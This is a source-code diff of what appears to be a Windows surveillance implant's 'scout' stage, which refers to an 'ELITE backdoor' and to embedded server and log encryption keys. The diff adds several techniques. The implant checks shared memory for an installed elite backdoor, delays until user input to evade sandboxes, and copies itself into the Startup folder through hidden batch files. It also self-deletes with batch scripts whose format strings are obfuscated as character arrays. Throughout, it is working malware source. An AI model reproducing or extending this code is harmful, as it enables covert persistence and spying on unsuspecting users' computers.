@@ -2,8 +2,10 @@
 #include <stdio.h>
 #include <Shlobj.h>
 #include <Shlwapi.h>
+#include <Sddl.h>
 
 #include "main.h"
+#include "md5.h"
 #include "api.h"
 #include "binpatched_vars.h"
 #include "autodelete_batch.h"
@@ -17,62 +19,164 @@
 #pragma comment(lib, "shlwapi")
 
 extern VOID SyncThreadFunction();
+extern PWCHAR GetRandomString(ULONG uMin);
+extern BYTE pServerKey[32];
+extern BYTE pConfKey[32];
+extern BYTE pSessionKey[20];
+extern BYTE pLogKey[32];
+extern BOOL bLastSync;
 
-BOOL uDrop = TRUE;
+BOOL uMelted = FALSE;
+PULONG uSynchro;
+BOOL bLastSync = FALSE;
+BOOL bSync = FALSE;
+HANDLE hScoutSharedMemory;
 
-__declspec(dllexport) VOID MyConf()
+//#pragma comment(linker, "/EXPORT:MyConf=?MyConf@@YAXXZ")
+__declspec(dllexport) PWCHAR MyConf(PULONG pSynchro)
 {
 #ifdef _DEBUG
-	OutputDebugString(L"[+] Setting uDrop to FALSE\n");
+	OutputDebugString(L"[+] Setting uMelted to TRUE\n");
 #endif
-	uDrop = FALSE;
+	uMelted = TRUE;
+	uSynchro = pSynchro;
+
+	//PWCHAR pScoutName = (PWCHAR)malloc(strlen(SCOUT_NAME)*sizeof(WCHAR) + 2*sizeof(WCHAR));
+	PWCHAR pScoutName = (PWCHAR)VirtualAlloc(NULL, strlen(SCOUT_NAME)*sizeof(WCHAR) + 2*sizeof(WCHAR), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
+	//_snwprintf_s(pScoutName, strlen(SCOUT_NAME)+2, _TRUNCATE, L"%S", SCOUT_NAME);
+	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, SCOUT_NAME, strlen(SCOUT_NAME), pScoutName, strlen(SCOUT_NAME) + 2);
+
+	return pScoutName;
 }
 
 
 int CALLBACK WinMain(HINSTANCE hInstance,
 	HINSTANCE hPrevInstance,
-	LPSTR    lpCmdLine,
-	int       nCmdShow)
+	LPSTR lpCmdLine,
+	int nCmdShow)
 {
 #ifdef _DEBUG_BINPATCH
 	MessageBox(NULL, L"_DEBUG_BINPATCH", L"_DEBUG_BINPATCH", 0);
 #endif
-
-	
-
-	// FIXME: decidere quanto waitare
-	// FIXME: bailout && malloc && free
-
 	if (GetCurrentProcessId() == 4)
+	{
 		MessageBox(NULL, L"I'm going to start the program", L"Warning", 0);
+		return 0;
+	}
+
+	memcpy(pServerKey, CLIENT_KEY, 32);
+	memcpy(pConfKey, ENCRYPTION_KEY_CONF, 32);
+	memcpy(pLogKey, ENCRYPTION_KEY, 32);
+#ifdef _DEBUG_BINPATCH
+	MD5((PBYTE)CLIENT_KEY, 32, (PBYTE)pServerKey);
+	MD5((PBYTE)ENCRYPTION_KEY_CONF, 32, (PBYTE)pConfKey);
+	MD5((PBYTE)ENCRYPTION_KEY, 32, (PBYTE)pLogKey);
+#endif
+
+	// first check for elite presence
+	if (ExistsEliteSharedMemory())
+	{
+#ifdef _DEBUG
+		OutputDebugString(L"[+] An ELITE backdoor is already installed here!\n");
+#endif
+		if (AmIFromStartup())
+		{
+			DeleteAndDie(FALSE);
+		}
+		if (uMelted)
+		{
+			*uSynchro = 1;
+			ExitThread(0);
+		}
+		else
+			return 0;
+	}
+	// check if I'm already running
+	if (ExistsScoutSharedMemory())
+	{
+#ifdef _DEBUG
+		OutputDebugString(L"[+] Scout already active\n");
+#endif
+		if (uMelted)
+		{
+			*uSynchro = 1;
+			ExitThread(0);
+		}
+		else
+			return 0;
+	}
+
+	if (!CreateScoutSharedMemory())
+	{
+#ifdef _DEBUG
+		OutputDebugString(L"[+] Cannot create shared memory\n");
+#endif
+		if (uMelted)
+		{
+			*uSynchro = 1;
+			ExitThread(0);
+		}
+		else
+			return 0;
+	}
+
+	MySleep(WAIT_DROP);	
+	if (!uMelted)
+		Drop();
 
 	UseLess();
 	WaitForInput();
-	Drop();
-	
+
 	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SyncThreadFunction, NULL, 0, NULL);
 	WaitForSingleObject(hThread, INFINITE);
+
+	if (hScoutSharedMemory)
+	{
+		CloseHandle(hScoutSharedMemory);
+		hScoutSharedMemory = NULL;
+	}
+	
+	if (uMelted)
+	{
+		*uSynchro = 1;
+		ExitThread(0);
+	}
+
+
+	return 0;
 }
 
 VOID Drop()
 {
-	PWCHAR pStartupPath = (PWCHAR)malloc(32767 * sizeof(WCHAR));
-	SHGetSpecialFolderPath(NULL, pStartupPath, CSIDL_STARTUP, TRUE); // TRUE == CREATE
-
-	PWCHAR pCurrentPath = (PWCHAR)malloc(32767 * sizeof(WCHAR));
-	GetModuleFileName(NULL, pCurrentPath, 32767);
-
-	*(StrRChr(pCurrentPath, NULL, L'\\')) = 0;
-	if (StrCmpI(pCurrentPath, pStartupPath))
+	if (!AmIFromStartup())
 	{
-		GetModuleFileName(NULL, pCurrentPath, 32767);
+#ifdef _DEBUG
+	OutputDebugString(L"[+] Dropping..\n");
+#endif
 
-		PWCHAR pFullName = (PWCHAR)malloc(32767 * sizeof(WCHAR));
-		memset(pFullName, 0x0, 32767*sizeof(WCHAR));
-		_swprintf(pFullName, L"%s\\%S.exe", pStartupPath, SCOUT_NAME);
+		PWCHAR pSourcePath = GetMySelfName();
+		PWCHAR pDestPath = GetStartupScoutName();
 		
-		CopyFile(pCurrentPath, pFullName, FALSE);
+		if (GetCurrentProcessId() == 4)
+			MessageBox(NULL, L"I'm going to start the program automatically, is it ok?", L"Warning", 1);
+
+		DoCopyFile(pSourcePath, pDestPath);
+
+		free(pSourcePath);
+		free(pDestPath);
 	}
+}
+
+VOID DoCopyFile(PWCHAR pSource, PWCHAR pDest)
+{
+	PWCHAR pBatchName;
+
+	CreateCopyBatch(pSource, pDest, &pBatchName);
+	StartBatch(pBatchName);
+	MySleep(2000);
+	DeleteFile(pBatchName);
+
+	free(pBatchName);
 }
 
 VOID UseLess()
@@ -90,7 +194,6 @@ VOID UseLess()
 }
 
 
-
 VOID WaitForInput()
 {
 	ULONG uLastInput;
@@ -99,7 +202,8 @@ VOID WaitForInput()
 #ifdef _DEBUG
 	OutputDebugString(L"[+] FIRST_WAIT\n");
 #endif
-	Sleep(FIRST_WAIT);
+	MySleep(WAIT_INPUT);
+
 
 	pLastInputInfo.cbSize = sizeof(LASTINPUTINFO);
 	GetLastInputInfo(&pLastInputInfo);
@@ -117,73 +221,377 @@ VOID WaitForInput()
 #ifdef _DEBUG
 			OutputDebugString(L"[+] GetLastInput FAILED\n");
 #endif
-			Sleep(FIRST_WAIT);
+			MySleep(3000);
 			break;
 		}
 
 #ifdef _DEBUG
 		OutputDebugString(L"[+] Waiting for input...\n");
 #endif
-		Sleep(5000);
+		MySleep(3000);
 	}
 }
 
 
-VOID DeleteAndDie()
+VOID DeleteAndDie(BOOL bDie)
 {
 	HANDLE hFile;
-	LPSTR pTempPath = (LPSTR)malloc(32767);
-	LPSTR pBatFileName = (LPSTR)malloc(32767);
-	char batch_format[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 's', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 's', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 's', '"', 0x0 };
+	char batch_format[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 'S', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 'S', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 'S', '"', 0x0 };
 
-	GetEnvironmentVariableA("TMP", pTempPath, 32767);
-	ULONG uTick = GetTickCount();
+	if (hScoutSharedMemory)
+	{
+		CloseHandle(hScoutSharedMemory);	
+		hScoutSharedMemory = NULL;
+	}
+
+	if (uMelted) // from melted app
+	{
+		PWCHAR pFullPath = GetStartupScoutName();
+		DeleteFile(pFullPath);
+		free(pFullPath);
+
+		if (bDie)
+		{
+			*uSynchro = 1;
+			ExitThread(0);
+		}
+		return;
+	}
+
+	// not melted
+	if (!AmIFromStartup())
+	{ 
+		PWCHAR pName = GetStartupScoutName();
+		DeleteFile(pName);
+		free(pName);
+
+		if (bDie)
+				ExitProcess(0);
+		else
+			return;
+	}
+	else // batch
+	{
+		PWCHAR pTempPath = GetTemp();
+		PWCHAR pBatFileName = (PWCHAR)malloc(32767 * sizeof(WCHAR));
+
+		ULONG uTick = GetTickCount();
+		do
+		{
+			_snwprintf_s(pBatFileName, 32766, _TRUNCATE, L"%s\\%d.bat", pTempPath, uTick++);
+			hFile = CreateFile(pBatFileName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+			if (hFile && hFile != INVALID_HANDLE_VALUE)
+				break;
+		}
+		while(1);
+
+#ifdef _DEBUG
+		OutputDebugString(pBatFileName);
+#endif
+
+		// get full filename in startup
+		PWCHAR pExeFileName = GetStartupScoutName();
+
+		// create batch buffer
+		ULONG uSize = strlen(batch_format) + 32676*3 + 1;
+		LPSTR pBatchBuffer = (LPSTR)malloc(uSize);
+		memset(pBatchBuffer, 0x0, uSize);
+		_snprintf_s(pBatchBuffer, uSize, _TRUNCATE, batch_format, pExeFileName, pExeFileName, pBatFileName);
+
+		// write it
+		ULONG uOut;
+		WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
+		CloseHandle(hFile);
+
+		if (StartBatch(pBatFileName))
+		{
+			if (bDie)
+			{
+				if (uMelted)
+				{
+					*uSynchro = 1;
+					ExitThread(0);
+				}
+				else
+					ExitProcess(0);
+			}
+			else
+				return;
+		}
+#ifdef _DEBUG
+		else
+			OutputDebugString(L"[!!] Error executing autodelete batch!!\n");
+#endif
+		free(pBatFileName);
+		free(pExeFileName);
+		free(pBatchBuffer);
+		free(pTempPath);
+	}
+}
+
+
+PCHAR GetScoutSharedMemoryName()
+{
+	PCHAR pName = (PCHAR)malloc(16);
+	memset(pName, 0x0, 16);
+
+	_snprintf_s(pName, 
+		16, 
+		_TRUNCATE, 
+		"%02X%02X%02X%02X%c%c", 
+		pServerKey[3], pServerKey[2], pServerKey[1], pServerKey[0], 'B', 'R');
+
+	return pName;
+}
+
+PCHAR GetEliteSharedMemoryName()
+{
+	PCHAR pName = (PCHAR)malloc(16);
+	memset(pName, 0x0, 16);
+
+	_snprintf_s(pName, 
+		16, 
+		_TRUNCATE, 
+		"%c%c%c%02X%02X%02X%02X", 
+		'F', 'S', 'B', pServerKey[0], pServerKey[1], pServerKey[2], pServerKey[3]);
+
+	return pName;
+}
+
+BOOL CreateScoutSharedMemory()
+{
+	PCHAR pName;
+
+#ifdef _DEBUG
+	OutputDebugString(L"[+] Creating scout shared memory\n");
+#endif
+	if (ExistsScoutSharedMemory())
+		return FALSE;
+
+	pName = GetScoutSharedMemoryName();
+	hScoutSharedMemory = CreateFileMappingA(INVALID_HANDLE_VALUE, 
+		NULL,
+		PAGE_READWRITE,
+		0,
+		SHARED_MEMORY_WRITE_SIZE,
+		pName);
+	free(pName);
+
+	if (hScoutSharedMemory)
+		return TRUE;
+
+	return FALSE;
+}
+
+BOOL ExistsScoutSharedMemory()
+{
+	PCHAR pName;
+	BOOL uRet = FALSE;
+
+	pName = GetScoutSharedMemoryName();
+	HANDLE hMem = OpenFileMappingA(FILE_MAP_READ, FALSE, pName);
+
+	if (hMem)
+	{
+		uRet = TRUE;
+		CloseHandle(hMem);
+	}
+
+	free(pName);
+	return uRet;
+}
+
+
+BOOL ExistsEliteSharedMemory()
+{
+	PCHAR pName;
+	BOOL uRet = FALSE;
+
+	pName = GetEliteSharedMemoryName();
+
+#ifdef _DEBUG
+	PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
+	swprintf_s((wchar_t *)pDebugString, 1024, L"[+] Looking for SharedMemory %S\n", pName);
+	OutputDebugString(pDebugString);
+	free(pDebugString);
+#endif
+
+	HANDLE hMem = OpenFileMappingA(FILE_MAP_READ, FALSE, pName);
+	if (hMem)
+	{
+		uRet = TRUE;
+		CloseHandle(hMem);
+	}
+#ifdef _DEBUG
+	else
+	{
+//		PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
+//		swprintf_s(pDebugString, 1024, L"[+] OpenFileMappingA, hMem: %08x, LastError: %08x\n", hMem, GetLastError());//
+//		OutputDebugString(pDebugString);
+//		free(pDebugString);
+	}
+#endif
+
+	free(pName);
+	return uRet;
+}
+
+
+BOOL AmIFromStartup()
+{
+	BOOL uRet;
+	PWCHAR pStartupPath = GetStartupPath();
+	PWCHAR pCurrentPath = GetMySelfName();
+
+	*(StrRChr(pCurrentPath, NULL, L'\\')) = 0;
+	if (StrCmpI(pCurrentPath, pStartupPath))
+		uRet = FALSE;
+	else
+		uRet = TRUE;
+	
+	free(pStartupPath);
+	free(pCurrentPath);
+	return uRet;
+}
+
+PWCHAR GetStartupPath()
+{
+	PWCHAR pStartupPath = (PWCHAR)malloc(32767*sizeof(WCHAR));
+	PWCHAR pShortPath = (PWCHAR)malloc(32767*sizeof(WCHAR));
+
+	SHGetSpecialFolderPath(NULL, pStartupPath, CSIDL_STARTUP, FALSE);
+	GetShortPathName(pStartupPath, pShortPath, 4096);
+
+	free(pStartupPath);
+	return pShortPath;
+}
+
+PWCHAR GetStartupScoutName()
+{
+	PWCHAR pStartupPath = GetStartupPath();
+	PWCHAR pFullPath = (PWCHAR)malloc(32767*sizeof(WCHAR));
+
+	_snwprintf_s(pFullPath, 32767, _TRUNCATE, L"%s\\%S.exe", pStartupPath, SCOUT_NAME);
+	free(pStartupPath);
+
+	return pFullPath;
+}
+
+
+PWCHAR GetMySelfName()
+{
+	PWCHAR pName = (PWCHAR)malloc(32767 * sizeof(WCHAR));
+	PWCHAR pShort = (PWCHAR)malloc(32767 * sizeof(WCHAR));
+
+	GetModuleFileName(NULL, pName, 32766);
+	GetShortPathName(pName, pShort, 32767);
+	free(pName);
+
+	return pShort;
+}
+
+PWCHAR GetTemp()
+{
+	PWCHAR pTemp = (PWCHAR)malloc(4096 * sizeof(WCHAR));
+	PWCHAR pShort = (PWCHAR)malloc(4096 * sizeof(WCHAR));
+
+	GetEnvironmentVariable(L"TMP", pTemp, 32767);
+	GetShortPathName(pTemp, pShort, 4096);
+
+	free(pTemp);
+	return pShort;
+}
+
+
+
+VOID MySleep(ULONG uTime)
+{
+	//HANDLE hThread = GetCurrentThread();
+	//WaitForSingleObject(hThread, uTime);
+	Sleep(uTime);
+}
+
+
+BOOL StartBatch(PWCHAR pName)
+{
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	PWCHAR pApplicationName = (PWCHAR)malloc(4096 * sizeof(WCHAR));
+	WCHAR pTempInterpreter[] = { L'%', L'S', L'Y', L'S', L'T', L'E', L'M', L'R', L'O', L'O', L'T', L'%', L'\\', L's', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\', L'c', L'm', L'd', L'.', L'e', L'x', L'e', 0x0 };
+	PWCHAR pInterpreter = (PWCHAR) malloc(32767 * sizeof(WCHAR));
+
+	ExpandEnvironmentStrings(pTempInterpreter, pInterpreter, 32767 * sizeof(WCHAR));
+	_snwprintf_s(pApplicationName, 4095, _TRUNCATE, L"/c %s", pName);
+
+	SecureZeroMemory(&si, sizeof(STARTUPINFO));
+	SecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
+	
+	BOOL bRet = CreateProcess(pInterpreter, pApplicationName, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+
+	free(pApplicationName);
+	free(pInterpreter);
+	return bRet;
+}
+
+
+VOID CreateDeleteBatch(PWCHAR pFileName, PWCHAR *pBatchOutName)
+{
+	HANDLE hFile;
+	ULONG uTick, uOut;
+	PWCHAR pTempPath = GetTemp();
+	PWCHAR pBatchName = (PWCHAR) malloc(32767*sizeof(WCHAR));
+	CHAR pBatchFormat[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 'S', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 'S', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 'S', '"', 0x0 };
+	PCHAR pBatchBuffer = (PCHAR) malloc(strlen(pBatchFormat) + (32767 * 3));
+	
+	uTick = GetTickCount();
 	do
 	{
-		_snprintf_s(pBatFileName, 32766, _TRUNCATE, "%s\\%d.bat", pTempPath, uTick++);
-		hFile = CreateFileA(pBatFileName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+		_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d.bat", pTempPath, uTick++);
+		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (hFile && hFile != INVALID_HANDLE_VALUE)
 			break;
 	}
-	while(1);
+	while (1);
 
-#ifdef _DEBUG
-	OutputDebugStringA(pBatFileName);
-#endif
-
-	LPSTR pExeFileName = (LPSTR)malloc(32767);
-	GetModuleFileNameA(NULL, pExeFileName, 32767);
-
-	ULONG uSize = strlen(batch_format) + 32676*3 + 1;
-	LPSTR pBatchBuffer = (LPSTR)malloc(uSize);
-	memset(pBatchBuffer, 0x0, uSize);
-	_snprintf_s(pBatchBuffer, uSize, _TRUNCATE, batch_format, pExeFileName, pExeFileName, pBatFileName);
-
-	ULONG uOut;
+	_snprintf_s(pBatchBuffer, strlen(pBatchFormat) + (32767 * 3), _TRUNCATE, pBatchFormat, pFileName, pFileName, pBatchName); 
 	WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
 	CloseHandle(hFile);
-	
-	STARTUPINFOA pSinfo;
-	PROCESS_INFORMATION pPinfo;
-	memset(&pSinfo, 0x0, sizeof(STARTUPINFOA));
-	memset(&pPinfo, 0x0, sizeof(PROCESS_INFORMATION));
-	
-	pSinfo.cb = sizeof(STARTUPINFO);
-	pSinfo.dwFlags = STARTF_USESHOWWINDOW;
-	pSinfo.wShowWindow = SW_HIDE;
-	if (CreateProcessA(NULL, pBatFileName, NULL, NULL, FALSE, 0, NULL, NULL, &pSinfo, &pPinfo))
-		ExitProcess(0);
-#ifdef _DEBUG
-	else
-		OutputDebugString(L"[!!] Error executing autodelete batch!!\n");
-#endif
 
-	free(pTempPath);
-	free(pBatFileName);
-	free(pExeFileName);
+	*pBatchOutName = pBatchName;
+
 	free(pBatchBuffer);
+	free(pTempPath);
 }
 
 
+VOID CreateCopyBatch(PWCHAR pSource, PWCHAR pDest, PWCHAR *pBatchOutName)
+{
+	HANDLE hFile;
+	ULONG uTick ,uOut;
+	PWCHAR pTempPath = GetTemp();
+	PWCHAR pBatchName = (PWCHAR)malloc(32767*sizeof(WCHAR));
+	CHAR pBatchFormat[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', 'c', 'o', 'p', 'y', ' ', '"', '%', 'S', '"', ' ', '"', '%', 'S', '"', 0x0};
+	PCHAR pBatchBuffer = (PCHAR)malloc(strlen(pBatchFormat) + (32767 * 3));
 
+	uTick = GetTickCount();
+	do
+	{
+		_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d.bat", pTempPath, uTick++);
+		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hFile && hFile != INVALID_HANDLE_VALUE)
+			break;
+	}
+	while (1);
 
+	_snprintf_s(pBatchBuffer, strlen(pBatchFormat) + (32767 * 3), _TRUNCATE, pBatchFormat, pSource, pDest);
+	WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
+	CloseHandle(hFile);
+
+	*pBatchOutName = pBatchName;
+
+	free(pBatchBuffer);
+	free(pTempPath);
+}
